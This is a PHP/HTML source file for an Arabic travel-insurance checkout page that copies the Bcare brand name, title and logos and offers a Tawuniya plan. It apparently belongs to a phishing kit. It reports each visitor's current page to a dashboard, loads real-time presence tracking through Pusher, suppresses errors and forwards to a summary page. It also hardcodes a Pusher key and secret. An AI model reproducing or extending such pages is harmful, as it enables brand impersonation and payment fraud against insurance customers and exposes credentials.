<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'شركات تأمين السفر');
}

if (isset($_GET['type'])) {
    $type = $_GET['type'];
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $_SESSION['totalprice'] = $_POST['totalprice'];
    $_SESSION['image'] = $_POST['image'];

    echo "<script>document.location.href='summary.php';</script>";
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> بي كير للتأمين : أفضل موقع مقارنة تأمين سيارة ومركبات | تأمينك Bcare</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Bootstrap JS (bundle includes Popper.js) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }

        a {
            text-decoration: none;
        }

        /* body {
            height: 2000vh;
        } */

        .bacOne {
            background-color: #156394;
        }

        .fa-solid,
        label {
            color: rgb(153, 153, 153);
        }

        label {
            font-weight: bold;
            font-size: 14px;
        }

        .fa-solid.active {
            color: rgb(194, 77, 141) !important;
        }

        .text-primary {
            color: #156394 !important;
        }

        .text-muted {
            color: rgb(153, 153, 153) !important;
        }

        ::placeholder {
            color: #d2d6da !important;
        }

        .bg-two {
            background-color: #156394;
        }

        .form-check-input:checked {
            background-color: orange !important;
            /* Bootstrap primary color or your custom color */
            border-color: orange;
        }

        /* Optional: Change the check mark dot color (on some browsers) */

        .form-check-input {
            width: 1.1em;
            height: 1.1em;
            border: 1px solid gray;
            /* Blue border, 2px thick */
        }

        .group {
            display: flex;
            align-items: center;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            height: 40px;
        }

        .bg-one {
            background-color: #156394;
            height: 40px;
            color: #f8f9fa;
        }

        .bg-o-two {
            height: 40px;
            height: 40px;
            background-color: rgb(240, 240, 240);
            color: rgb(153, 153, 153) !important;
        }

        .bg-a-two {
            height: 40px;
            background-color: rgb(230, 228, 228);
            color: rgb(153, 153, 153) !important;
        }

        .forShow {
            display: flex;
            gap: 10px;
        }

        .ajamaclas {
            display: flex;
            justify-content: start;
            align-items: center;
        }

        .active {
            background-color: #a1cdda;
            border: 1px solid #31849b;
        }

        .bdgs {
            background-image: url(./assets/TPL.svg);
            background-repeat: no-repeat;
        }

        .bg-light {
            background-color: #f2f2f3 !important;
        }
    </style>
    <link rel="stylesheet" href="./assets/css/theme.css">
</head>

<body class="bg-white">

    <nav class="d-flex justify-content-center py-2 shadow-sm">
        <a href="index.php">
            <a href="index.php">
                <img src="./assets/Bcare-logo.svg" alt="">
            </a>
        </a>
    </nav>

    <div class="container" style="margin: 50px 0 100px 0;">
        <div class="row d-flex flex-column gap-5">    
            <div class="col-12">
                <div class="bg-light px-2 py-3 shadow-lg" style="border: 1px solid #156394;border-radius: 10px;">
                    <div class="px-3">
                        <img src="./assets/Tawuniya.svg" width="70" alt="">
                    </div>
                    <hr>
                    <div>
                        <h6 class="fw-bold text-primary my-4">المنافع الإضافية</h6>
                        <div>
                            <input type="checkbox" disabled class="form-check-input" checked id="check1" name="check1" required>
                            <label for="" class="text-primary" style="font-size: 12px;"> مصاريف الرعاية الطبية الطارئة </label>
                        </div>
                        <div>
                            <input type="checkbox" disabled class="form-check-input" checked id="check1" name="check1" required>
                            <label for="" class="text-primary" style="font-size: 12px;"> الرعاية الطبية الطارئة للأسنان </label>
                        </div>
                        <div>
                            <input type="checkbox" disabled class="form-check-input" checked id="check1" name="check1" required>
                            <label for="" class="text-primary" style="font-size: 12px;"> منافع التنويم بالمستشفى </label>
                        </div>
                        <div>
                            <input type="checkbox" disabled class="form-check-input" checked id="check1" name="check1" required>
                            <label for="" class="text-primary" style="font-size: 12px;"> إلغاء أو تقليص </label>
                        </div>
                        <div>
                            <input type="checkbox" disabled class="form-check-input" checked id="check1" name="check1" required>
                            <label for="" class="text-primary" style="font-size: 12px;"> تأخير الأمتعة </label>
                        </div>
                        <div>
                            <input type="checkbox" disabled class="form-check-input" checked id="check1" name="check1" required>
                            <label for="" class="text-primary" style="font-size: 12px;"> فقدان الأمتعة  أو الأغراض الشخصية </label>
                        </div>
                        <div>
                            <input type="checkbox" disabled class="form-check-input" checked id="check1" name="check1" required>
                            <label for="" class="text-primary" style="font-size: 12px;"> حادث شخصي </label>
                        </div>
                    </div>
                    <hr class="active my-3">
                    <div class="mt-5 d-flex gap-2 justify-content-center">
                        <div class="d-flex justify-content-center align-items-center px-4 " style="border: 1px solid #226894;border-top: none;border-bottom: none;">
                            <small class="fw-bold text-primary">الشروط والأحكام</small>
                        </div>
                        <div class="text-center flex-fill pt-2" style="border: 2px solid #f9a824;border-radius: 10px;">
                            <h6 class="text-primary fw-bold">الإجمالي</h6>
                            <h6 class="text-primary fw-bold">63.25 ريال</h6>
                            <form action="" method="POST">
                                <input type="hidden" id="totalprice" name="totalprice" value="63.25">
                                <input type="hidden" name="image" value="Tawuniya.svg">
                                <button type="submit" name="submit" style="background-color: #f9a824;" class="w-100 btn btn-sm fw-bold text-white">اشتري الآن</button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

        </div>
    </div>


    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script src="js/presence-tracker.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;
    </script>
<?php include 'chat_widget.php'; ?>
</body>

</html>
